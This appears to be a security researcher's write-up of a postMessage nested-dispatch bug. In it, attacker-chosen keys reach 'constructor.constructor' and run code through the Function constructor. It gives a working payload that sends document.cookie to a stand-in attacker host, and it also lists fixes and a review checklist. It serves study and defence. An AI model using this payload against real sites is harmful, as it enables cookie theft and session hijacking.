# postMessage Nested Dispatch + Function Constructor Gadget

## Date

2026-07-10

## Target Type

Embedded widgets, SDK handoff pages, nested logging/dispatch helpers, and review/admin-bot flows that accept `postMessage` commands

## Bug Class

Client-side trust failure through attacker-controlled nested property dispatch, prototype-chain access, and `Function` constructor code execution

## Initial Signal

Look for handlers shaped like:

```javascript
window.addEventListener('message', (event) => {
  if (event.data && event.data.action === 'log') {
    log[event.data.cat][event.data.message_type](event.data)();
  }
});
```

Or any variant that does:

- `registry[event.data.type][event.data.name](event.data)()`
- `handlers[key][subkey](payload)()`
- chained bracket access with user-controlled keys before a final invocation

Also look for:

- no `event.origin` check
- debug logging objects exposed in production embeds
- partner/reviewer flows that open attacker URLs in authenticated sessions

## Pattern

The attacker does not need a string sink in `pageName` or similar fields. The routing itself becomes the gadget.

### Benign path

```javascript
log.error.general(data)()
```

This returns and immediately invokes a logging closure. `data.pageName` only reaches `console.log`, which is not a useful HTML XSS sink.

### Gadget path

Because `log` is a plain object:

```javascript
log.constructor === Object
log.constructor.constructor === Function
```

So:

```javascript
log['constructor']['constructor'](event.data)()
```

becomes:

```javascript
Function(event.data)()
```

### Structured-clone payload

Use an array so the function body survives `postMessage`:

```javascript
const code = 'fetch("https://attacker/?c="+encodeURIComponent(document.cookie))';
const p = [code];
p.action = 'log';
p.cat = 'constructor';
p.message_type = 'constructor';
target.postMessage(p, '*');
```

Arrays keep `action`, `cat`, and `message_type` through structured clone. Custom `toString` functions do not.

## Failed Assumptions

- `pageName` string concatenation is the main exploit path
- only top-level `window[func]` dispatch is worth testing
- iframe embedding is enough to steal reviewer cookies
- `Function(object)` executes when the object is a plain `{...}` instead of an array

## Working Theory

When reviewing nested dispatchers, test whether attacker-controlled keys can reach:

- `constructor`
- `__proto__`
- `prototype`
- unexpected but callable properties whose return value is itself invoked

If the code ends with `(...)()`, you have two execution points:

1. the selected handler function
2. the value it returns

## Fix

- hardcode routing tables; do not reflect user input into nested lookups
- validate `event.origin`
- reject unknown `action`, `cat`, and `message_type` values
- remove debug bridges from production embeds

## Future Checklist Item

For `postMessage` listeners, grep for:

- `][`
- `event.data.cat`
- `message_type`
- trailing `()()` call chains

Then test `constructor` / `constructor` key pairs before spending time on reflected field injection inside log messages.
